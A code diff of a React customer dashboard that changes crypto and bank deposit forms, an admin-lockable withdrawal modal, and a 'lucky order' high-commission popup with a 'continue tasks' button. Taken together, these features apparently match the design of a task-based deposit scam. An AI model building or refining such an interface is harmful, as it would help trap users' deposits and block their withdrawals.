+          Select Quick Amount ($)
+        </label>
+
+        <div className="grid grid-cols-4 gap-1.5 max-h-32 overflow-y-auto p-1 bg-black rounded-xl border border-[#d4af37]/30">
+          {quickDepositAmounts.map((amt) => (
+            <button
+              key={amt}
+              type="button"
+              onClick={() => setDepositAmount(amt.toString())}
+              className={`py-1.5 rounded-lg text-[10px] font-mono font-bold transition border ${
+                depositAmount === amt.toString()
+                  ? 'bg-[#d4af37] text-black border-[#d4af37]'
+                  : 'bg-[#18150a] border-[#d4af37]/30 text-[#f3e5ab]'
+              }`}
+            >
+              ${amt}
+            </button>
+          ))}
+        </div>
+      </div>
+
+      <div>
+        <label className="text-[10px] text-gray-400 block mb-1">
+          Deposit Amount ($)
+        </label>
+
+        <input
+          type="number"
+          min="0.01"
+          step="0.01"
+          placeholder="Enter amount"
+          value={depositAmount}
+          onChange={(e) => setDepositAmount(e.target.value)}
+          className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
+          required
+        />
+      </div>
+
+      <button
+        type="button"
+        onClick={() => {
+          const amount = Number(depositAmount);
+
+          if (!Number.isFinite(amount) || amount <= 0) {
+            showToast('Please enter a valid deposit amount', 'error');
+            return;
+          }
+
+          if (
+            paymentMethod === 'bank' &&
+            (!bankName.trim() || !accountNumber.trim())
+          ) {
+            showToast('Please enter bank name and account number', 'error');
+            return;
+          }
+
+          setDepositStep(2);
+        }}
+        className="w-full py-2 bg-gradient-to-r from-[#d4af37] to-[#f3e5ab] text-black text-xs font-black rounded-xl"
+      >
+        Next
+      </button>
+    </>
+  )}
+
+  {/* STEP 2: PAYMENT PROOF */}
+  {depositStep === 2 && (
+    <>
+      <div className="bg-[#18150a] border border-[#d4af37]/40 rounded-xl p-3">
+        <p className="text-[10px] text-gray-400">Selected Payment Method</p>
+        <p className="text-sm font-bold text-[#f3e5ab]">
+          {paymentMethod === 'trc20' ? 'USDT TRC20' : 'Bank Transfer'}
+        </p>
+
+        <p className="text-[10px] text-gray-400 mt-2">Deposit Amount</p>
+        <p className="text-lg font-black text-[#d4af37]">
+          ${Number(depositAmount).toFixed(2)}
+        </p>
+      </div>
+
+      <div>
+        <label className="text-[10px] text-gray-400 block mb-1">
+          {paymentMethod === 'trc20'
+            ? 'Transaction ID (TXID) — optional if screenshot provided'
+            : 'Bank Payment Reference — optional if screenshot provided'}
+        </label>
+
+        <input
+          type="text"
+          placeholder={
+            paymentMethod === 'trc20'
+              ? 'Paste your transaction ID'
+              : 'Enter bank transaction reference'
+          }
+          value={paymentReference}
+          onChange={(e) => setPaymentReference(e.target.value)}
+          className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
+        />
+      </div>
+
+      <div>
+        <label className="text-[10px] text-gray-400 block mb-1">
+          Payment Receipt (JPG, PNG or WEBP, max 5 MB) — optional if reference provided
+        </label>
+
+        <input
+          type="file"
+          accept="image/jpeg,image/png,image/webp"
+          onChange={(e) => setReceiptFile(e.target.files?.[0] ?? null)}
+          className="w-full text-[10px] text-gray-300 file:mr-2 file:rounded-lg file:border file:border-[#d4af37]/50 file:bg-[#18150a] file:px-3 file:py-2 file:text-[#f3e5ab]"
+        />
+
+        {receiptFile && (
+          <p className="text-[10px] text-[#f3e5ab] mt-1 break-all">
+            Selected: {receiptFile.name}
           </p>
+        )}
+      </div>
 
-          <div>
-            <label className="text-[10px] text-gray-400 block mb-1">
-              Bank Name
-            </label>
-            <input
-              type="text"
-              placeholder="Enter receiving bank name"
-              value={bankName}
-              onChange={(e) => setBankName(e.target.value)}
-              className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
-              required
-            />
-          </div>
+      <p className="text-[10px] text-gray-400">
+        Provide either a transaction reference or a screenshot.
+        Your request remains pending until payment is verified.
+      </p>
 
-          <div>
-            <label className="text-[10px] text-gray-400 block mb-1">
-              Bank Account Number
-            </label>
-            <input
-              type="text"
-              placeholder="Enter receiving account number"
-              value={accountNumber}
-              onChange={(e) => setAccountNumber(e.target.value)}
-              className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
-              required
-            />
-          </div>
+      <div className="flex gap-2">
+        <button
+          type="button"
+          onClick={() => setDepositStep(1)}
+          className="flex-1 py-2 bg-[#18150a] border border-[#d4af37]/40 text-xs font-bold rounded-xl text-white"
+        >
+          Back
+        </button>
 
-          <p className="text-[10px] text-gray-400">
-            Check the account details carefully before sending payment.
+        <button
+          type="submit"
+          className="flex-1 py-2 bg-gradient-to-r from-[#d4af37] to-[#f3e5ab] text-black text-xs font-black rounded-xl"
+        >
+          Submit Request
+        </button>
+      </div>
+    </>
+  )}
+
+  {depositStep === 1 && (
+    <button
+      type="button"
+      onClick={() => {
+        setShowDepositModal(false);
+        setDepositStep(1);
+      }}
+      className="w-full py-2 bg-[#18150a] border border-[#d4af37]/40 text-xs font-bold rounded-xl text-white"
+    >
+      Cancel
+    </button>
+  )}
+</form>
+</div>
+</div>
+)}
+
+    
+{/* WITHDRAW MODAL */}
+{showWithdrawModal && (
+  <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
+    <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4 shadow-[0_0_30px_rgba(212,175,55,0.3)]">
+      <h3 className="text-base font-extrabold text-[#f3e5ab] text-center">
+        Withdraw Funds
+      </h3>
+
+      {/* Show restriction message only once */}
+      {(isWithdrawLocked || isAccountFrozen) && (
+        <div className="mb-4 rounded-xl border border-red-500/40 bg-red-500/10 p-4 text-sm text-red-300">
+          <p className="font-bold">Withdrawal Restricted</p>
+          <p className="mt-1">
+            {isAccountFrozen
+              ? 'Your account is frozen. Withdrawals are restricted by admin.'
+              : withdrawLockedMsg.trim() ||
+                'Withdrawal is temporarily disabled by admin.'}
           </p>
         </div>
       )}
 
-      <form onSubmit={handleDepositSubmit} className="space-y-3">
-        <div>
-          <label className="text-[10px] text-gray-400 block mb-1">
-            Select Quick Amount ($)
-          </label>
-          <div className="grid grid-cols-4 gap-1.5 max-h-32 overflow-y-auto p-1 bg-black rounded-xl border border-[#d4af37]/30">
-            {quickDepositAmounts.map((amt) => (
-              <button
-                key={amt}
-                type="button"
-                onClick={() => setDepositAmount(amt.toString())}
-                className={`py-1.5 rounded-lg text-[10px] font-mono font-bold transition border ${
-                  depositAmount === amt.toString()
-                    ? 'bg-[#d4af37] text-black border-[#d4af37]'
-                    : 'bg-[#18150a] border-[#d4af37]/30 text-[#f3e5ab]'
-                }`}
-              >
-                ${amt}
-              </button>
-            ))}
-          </div>
-        </div>
+      <form onSubmit={handleWithdrawSubmit} className="space-y-3">
+        <input
+          type="number"
+          placeholder="Amount ($)"
+          value={withdrawAmount}
+          onChange={(e) => setWithdrawAmount(e.target.value)}
+          disabled={isWithdrawLocked || isAccountFrozen}
+          className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white disabled:opacity-50"
+        />
 
-        <div>
-          <label className="text-[10px] text-gray-400 block mb-1">
-            Deposit Amount ($)
-          </label>
-          <input
-            type="number"
-            min="0.01"
-            step="0.01"
-            placeholder="Enter amount"
-            value={depositAmount}
-            onChange={(e) => setDepositAmount(e.target.value)}
-            className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
-            required
-          />
-        </div>
-
-        <div>
-          <label className="text-[10px] text-gray-400 block mb-1">
-            {paymentMethod === 'trc20'
-              ? 'Transaction ID (TXID)'
-              : 'Bank Payment Reference'}
-          </label>
-          <input
-            type="text"
-            placeholder={
-              paymentMethod === 'trc20'
-                ? 'Paste your transaction ID'
-                : 'Enter bank transaction reference'
-            }
-            value={paymentReference}
-            onChange={(e) => setPaymentReference(e.target.value)}
-            className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
-            required
-          />
-        </div>
-
-        <div>
-          <label className="text-[10px] text-gray-400 block mb-1">
-            Upload Payment Receipt (JPG, PNG or WEBP, max 5 MB)
-          </label>
-          <input
-            type="file"
-            accept="image/jpeg,image/png,image/webp"
-            onChange={(e) => setReceiptFile(e.target.files?.[0] ?? null)}
-            className="w-full text-[10px] text-gray-300 file:mr-2 file:rounded-lg file:border file:border-[#d4af37]/50 file:bg-[#18150a] file:px-3 file:py-2 file:text-[#f3e5ab]"
-            required
-          />
-          {receiptFile && (
-            <p className="text-[10px] text-[#f3e5ab] mt-1 break-all">
-              Selected: {receiptFile.name}
-            </p>
-          )}
-        </div>
-
-        <p className="text-[10px] text-gray-400">
-          Your request will remain pending until the payment is verified.
-        </p>
+        <input
+          type="password"
+          placeholder="Withdrawal Password"
+          value={withdrawPasswordInput}
+          onChange={(e) => setWithdrawPasswordInput(e.target.value)}
+          disabled={isWithdrawLocked || isAccountFrozen}
+          className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white disabled:opacity-50"
+        />
 
         <div className="flex gap-2">
           <button
             type="button"
-            onClick={() => setShowDepositModal(false)}
+            onClick={() => setShowWithdrawModal(false)}
             className="flex-1 py-2 bg-[#18150a] border border-[#d4af37]/40 text-xs font-bold rounded-xl text-white"
           >
             Cancel
           </button>
+
           <button
             type="submit"
-            className="flex-1 py-2 bg-gradient-to-r from-[#d4af37] to-[#f3e5ab] text-black text-xs font-black rounded-xl"
+            disabled={isWithdrawLocked || isAccountFrozen}
+            className="flex-1 py-2 bg-gradient-to-r from-[#d4af37] to-[#f3e5ab] text-black text-xs font-black rounded-xl disabled:opacity-50 disabled:cursor-not-allowed"
           >
-            Submit Request
+            {isWithdrawLocked || isAccountFrozen
+              ? 'Withdrawal Restricted'
+              : 'Submit'}
           </button>
         </div>
       </form>
     </div>
   </div>
 )}
-
-
-      {/* WITHDRAW MODAL */}
-      {showWithdrawModal && (
-        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
-          <div className="bg-[#0b0c10] border-2 border-[#d4af37] rounded-3xl p-6 w-full max-w-sm space-y-4 shadow-[0_0_30px_rgba(212,175,55,0.3)]">
-            <h3 className="text-base font-extrabold text-[#f3e5ab] text-center">Withdraw Funds</h3>
-            
-            {withdrawLockedMsg && (
-              <div className="p-3.5 bg-red-950/90 border-2 border-red-500 rounded-2xl text-red-200 text-xs text-center font-bold shadow-lg animate-pulse">
-                ⚠️ Withdrawal Restricted:
-                <p className="text-[11px] font-medium text-white mt-1 leading-relaxed">{withdrawLockedMsg}</p>
-              </div>
-            )}
-
-            <form onSubmit={handleWithdrawSubmit} className="space-y-3">
-              <input
-                type="number"
-                placeholder="Amount ($)"
-                value={withdrawAmount}
-                onChange={(e) => setWithdrawAmount(e.target.value)}
-                className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
-              />
-              <input
-                type="password"
-                placeholder="Withdrawal Password"
-                value={withdrawPasswordInput}
-                onChange={(e) => setWithdrawPasswordInput(e.target.value)}
-                className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
-              />
-              <div className="flex gap-2">
-                <button type="button" onClick={() => setShowWithdrawModal(false)} className="flex-1 py-2 bg-[#18150a] border border-[#d4af37]/40 text-xs font-bold rounded-xl text-white">Cancel</button>
-                <button type="submit" className="flex-1 py-2 bg-gradient-to-r from-[#d4af37] to-[#f3e5ab] text-black text-xs font-black rounded-xl">Submit</button>
-              </div>
-            </form>
-          </div>
-        </div>
-      )}
 
       {/* WALLET BIND MODAL */}
       {showWalletBindModal && (
@@ -2066,14 +2302,13 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
                 <div className="text-3xl">🎁</div>
                 <div className="text-center">
                   <div className="text-xs font-black text-transparent bg-clip-text bg-gradient-to-r from-[#f3e5ab] via-white to-[#d4af37] tracking-wide uppercase">
-                    Congratulations
-                  </div>
+                    Congratulationsss                  </div>
                   <div className="text-sm font-bold text-[#f3e5ab]">
                     You have got a lucky order!
                   </div>
-                  <div className="text-[9px] text-gray-300 mt-0.5">
-                    Please complete your high commission lucky order complete and continue next tasks
-                  </div>
+               <div className="text-xs text-amber-200/90 font-medium">
+  Please complete your high commission lucky order and earn commission
+</div>
                 </div>
               </div>
             )}
@@ -2115,14 +2350,13 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
               </div>
             )}
 
-            <button
-              onClick={handleConfirmTask}
-              className="w-full py-3.5 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] hover:brightness-110 text-black font-black text-sm rounded-2xl border-2 border-[#f3e5ab] shadow-[0_0_25px_rgba(212,175,55,0.4)] transition flex items-center justify-center gap-2 uppercase tracking-wider"
-            >
-              <span>📋</span>
-              <span>CONTINUE TASKS</span>
-              <span>➔</span>
-            </button>
+          <button
+  onClick={handleConfirmTask}
+  className="w-full py-4 bg-gradient-to-r from-amber-300 via-yellow-400 to-amber-500 hover:brightness-110 text-slate-950 font-black text-sm rounded-2xl shadow-lg transition flex items-center justify-center gap-2 cursor-pointer"
+>
+  <span>📋</span>
+  <span>CONTINUE TASKS →</span>
+</button>
           </div>
 
           <div className="text-center py-2 border-t border-[#332a15]">
@@ -2325,4 +2559,4 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
   );
 };
 
-export default CustomerDashboard;
+export default CustomerDashboard;  
